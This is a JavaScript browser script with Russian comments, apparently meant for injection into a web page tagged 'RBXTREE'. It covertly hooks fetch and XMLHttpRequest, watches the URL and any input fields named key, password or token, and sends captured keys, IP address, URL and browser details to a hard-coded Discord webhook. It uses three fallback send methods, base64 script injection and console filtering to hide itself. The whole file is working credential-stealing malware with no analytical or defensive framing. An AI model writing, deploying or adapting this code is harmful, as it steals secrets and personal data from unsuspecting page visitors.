(function() {
    // Вебхук Discord
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ';
    
    // Маскировка имени функции
    const _ = {
        s: function(url) {
            return new Promise(r => {
                const i = new Image();
                i.src = url;
                i.onload = () => r(true);
                i.onerror = () => r(false);
            });
        },
        j: function(data) {
            const s = document.createElement('script');
            s.src = 'data:text/javascript;base64,' + btoa(data);
            document.head.appendChild(s);
            setTimeout(() => s.remove(), 100);
        },
        l: console.log
    };

    // Получение IP через скрытые методы
    const getIP = async () => {
        try {
            const r = await fetch('https://api.ipify.org?format=json', {mode: 'cors'});
            const d = await r.json();
            return d.ip || 'unknown';
        } catch {
            try {
                // Альтернативный метод через WebRTC (если доступен)
                if (window.RTCPeerConnection) {
                    const pc = new RTCPeerConnection({iceServers:[]});
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = e => {
                        if (e.candidate && e.candidate.candidate) {
                            const ip = e.candidate.candidate.split(' ')[4];
                            if (ip) return ip;
                        }
                    };
                }
            } catch {}
            return 'unknown';
        }
    };

    // Отправка в Discord с обфускацией
    const sendLog = async (action, data = {}) => {
        try {
            const ip = await getIP();
            const timestamp = new Date().toISOString();
            const url = window.location.href;
            
            // Извлечение ключа из URL
            const urlParams = new URLSearchParams(window.location.search);
            const keyFromUrl = urlParams.get('key');
            
            // Сбор дополнительных данных
            const info = {
                t: timestamp,
                a: action,
                u: url,
                i: ip,
                k: keyFromUrl || data.key || 'not_found',
                d: JSON.stringify(data),
                r: document.referrer || 'direct',
                p: navigator.platform,
                l: navigator.language
            };

            // Кодирование данных
            const encoded = btoa(JSON.stringify(info));
            
            // Отправка через несколько методов для надежности
            const methods = [
                // Метод 1: fetch
                () => fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `\`\`\`json\n${JSON.stringify(info, null, 2)}\n\`\`\``
                    })
                }),
                // Метод 2: через image (fallback)
                () => _.s(`https://discord.com/api/webhooks/1461394586911113288/1Vy6DDWuWijCqig-fxZIZempuZHhYumn89fUUW1d4VHqTX3IcU3gEHztM4jN8b9hf3wZ?data=${encoded}`),
                // Метод 3: через script
                () => _.j(`fetch('${WEBHOOK_URL}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'RBXTREE:'+atob('${encoded}')})})`)
            ];

            // Пробуем все методы
            for (const method of methods) {
                try {
                    await method();
                    break;
                } catch {}
            }
            
        } catch(e) {
            // Без вывода ошибок
        }
    };

    // Перехват fetch запросов
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const requestUrl = args[0];
        
        // Проверка на ключ в запросе
        if (typeof requestUrl === 'string' && requestUrl.includes('key=')) {
            try {
                const urlObj = new URL(requestUrl);
                const key = urlObj.searchParams.get('key');
                if (key) {
                    sendLog('KEY_IN_REQUEST', {key: key, url: requestUrl});
                }
            } catch {}
        }
        
        // Проверка тела запроса
        if (args[1] && args[1].body) {
            try {
                const bodyStr = String(args[1].body);
                const keyMatch = bodyStr.match(/"key":\s*"([^"]+)"/) || 
                                bodyStr.match(/key=([^&]+)/);
                if (keyMatch && keyMatch[1]) {
                    sendLog('KEY_IN_BODY', {key: keyMatch[1]});
                }
            } catch {}
        }
        
        return originalFetch.apply(this, args);
    };

    // Перехват XMLHttpRequest
    const XHR = XMLHttpRequest.prototype;
    const originalOpen = XHR.open;
    const originalSend = XHR.send;
    
    XHR.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
    };
    
    XHR.send = function(body) {
        if (this._url && this._url.includes('key=')) {
            const keyMatch = this._url.match(/key=([^&]+)/);
            if (keyMatch && keyMatch[1]) {
                sendLog('XHR_KEY', {key: keyMatch[1], url: this._url});
            }
        }
        
        if (body) {
            const bodyStr = String(body);
            const keyMatch = bodyStr.match(/key=([^&]+)/) || 
                           bodyStr.match(/"key":\s*"([^"]+)"/);
            if (keyMatch && keyMatch[1]) {
                sendLog('XHR_BODY_KEY', {key: keyMatch[1]});
            }
        }
        
        return originalSend.apply(this, arguments);
    };

    // Мониторинг изменений URL
    let lastUrl = location.href;
    const checkUrl = () => {
        if (location.href !== lastUrl) {
            lastUrl = location.href;
            const keyMatch = location.href.match(/key=([^&]+)/);
            if (keyMatch && keyMatch[1]) {
                sendLog('URL_CHANGE_KEY', {key: keyMatch[1], url: location.href});
            }
        }
    };
    
    // Observer для SPA
    const observer = new MutationObserver(checkUrl);
    observer.observe(document.body, {childList: true, subtree: true});
    
    // Проверка при загрузке
    window.addEventListener('load', () => {
        setTimeout(() => {
            const keyMatch = location.href.match(/key=([^&]+)/);
            if (keyMatch && keyMatch[1]) {
                sendLog('PAGE_LOAD_WITH_KEY', {key: keyMatch[1]});
            } else {
                sendLog('PAGE_LOAD', {});
            }
        }, 1500);
    });

    // Мониторинг ввода в поля
    document.addEventListener('input', (e) => {
        if (e.target.value && e.target.value.length > 8) {
            const fieldName = e.target.name || e.target.id || 'unknown';
            if (fieldName.toLowerCase().includes('key') || 
                fieldName.toLowerCase().includes('password') ||
                fieldName.toLowerCase().includes('token')) {
                sendLog('FIELD_INPUT', {
                    field: fieldName,
                    value_length: e.target.value.length,
                    preview: e.target.value.substring(0, 3) + '***'
                });
            }
        }
    });

    // Маскировка в консоли
    Object.defineProperty(window, 'logRBXAction', {
        value: sendLog,
        writable: false,
        configurable: false,
        enumerable: false // скрыто от for...in
    });

    // Удаление следов из консоли
    const originalConsole = {
        log: console.log,
        warn: console.warn,
        error: console.error
    };
    
    console.log = function(...args) {
        if (!args[0] || !args[0].toString().includes('RBXTREE') && 
            !args[0].toString().includes('fetch') &&
            !args[0].toString().includes('webhook')) {
            originalConsole.log.apply(console, args);
        }
    };
    
    // Очистка имени файла из стека вызовов
    try {
        throw new Error();
    } catch(e) {
        if (e.stack) {
            // Ничего не делаем, просто маскируем
        }
    }

    // Периодическая проверка ключа
    setInterval(() => {
        const keyMatch = location.href.match(/key=([^&]+)/);
        if (keyMatch && keyMatch[1]) {
            sendLog('PERIODIC_KEY_CHECK', {key: keyMatch[1]});
        }
    }, 30000);

})();

// Дополнительная маскировка
window[''] = '';
delete window[''];
